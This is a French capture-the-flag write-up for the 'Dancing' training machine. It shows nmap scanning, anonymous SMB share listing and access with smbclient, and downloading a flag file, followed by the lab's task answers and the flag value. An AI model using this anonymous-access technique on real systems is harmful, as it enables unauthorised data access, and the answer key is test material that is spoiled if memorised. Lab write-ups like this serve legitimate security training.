
# DANCING

![alt text](image.png)

#protocols #SMB #reconnaissance #anonymous/guest access

## 1. Méthodologie

On commence par l'énumération habituelle avec la commande `nmap -sV IP_cible`

```
└──╼ [★]$ nmap -sV 10.129.166.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 12:14 CST
Nmap scan report for 10.129.166.112
Host is up (0.0095s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Le port 445 (SMB) est ouvert, nous allons essayer de nous connecter par là avec `smbclient IP_cible`. Nous n'avons pas les credentials pour s'authentifier donc nous tentons de lister les partages avec `smbclient -L IP_cible -p 445`. Le mot de passe est demandé mais même sans mot de passe, nous arrivons à afficher les partages.

```
└──╼ [★]$ smbclient -L 10.129.166.112 -p 445
Password for [WORKGROUP\arcanelle]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.166.112 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Nous essayons ensuite d'accéder à l'un de ses partages en tentant des connexions avec `smbclient \\\\IP_cible\\share_name`

```
└──╼ [★]$ smbclient \\\\10.129.166.112\\ADMIN$
Password for [WORKGROUP\arcanelle]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```
```
└──╼ [★]$ smbclient \\\\10.129.166.112\\C$
Password for [WORKGROUP\arcanelle]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```
```
└──╼ [★]$ smbclient \\\\10.129.166.112\\IPC$
Password for [WORKGROUP\arcanelle]:
Try "help" to get a list of possible commands.
smb: \> 
```
```
└──╼ [★]$ smbclient \\\\10.129.166.112\\WorkShares
Password for [WORKGROUP\arcanelle]:
Try "help" to get a list of possible commands.
smb: \> 
```

Nous avons donc accès aux partages nommés "IPC$" et "WorkShares". Nous explorons alors "IPC$" avec `ls` : 

```
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

Le dossier ne contient rien, je vais donc faire la même chose dans WorkShares:

```
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1733522 blocks available
```

Il faut ensuite explorer tous les dossier avec les commandes `cd` et `ls`. Pour le dossier Amy.J :

```
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 04:08:24 2021
  ..                                  D        0  Mon Mar 29 04:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 06:00:37 2021

		5114111 blocks of size 4096. 1750234 blocks available
```
Pour le dossier James.P:

```
smb: \> cd James.p
smb: \James.p\> ls
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 04:26:57 2021

		5114111 blocks of size 4096. 1750234 blocks available
```
Il faut ensuite transférer le fichier flag.txt vers notre machine avec la commande `get flag.txt`. Cette commande va envoyer le fichier dans le répertoire dans lequel nous étions avant de lancer la commande SMB, ici dans mon /home/user.

```
smb: \James.p\> get flag.txt
getting file \James.p\flag.txt of size 32 as flag.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```
Nous pouvons quitter le smb avec la commande `exit`:

```
smb: \James.p\> exit
```

Puis nous pouvons afficher le fichier avec la commande `cat file_name` :

```
└──╼ [★]$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

## 2. Questions

### Task 1

What does the 3-letter acronym SMB stand for?

```
server message block
```

### Task 2

What port does SMB use to operate at?

```
445
```

### Task 3

What is the service name for port 445 that came up in our Nmap scan?

```
microsoft-ds
```

### Task 4

What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

```
-L
```

### Task 5

How many shares are there on Dancing?

```
4
```

### Task 6

What is the name of the share we are able to access in the end with a blank password?

```
WorkShares
```

### Task 7

What is the command we can use within the SMB shell to download the files we find?

```
get flag.txt
```

### Flag

```
5f61c10dffbc77a704d76016a22f1664
```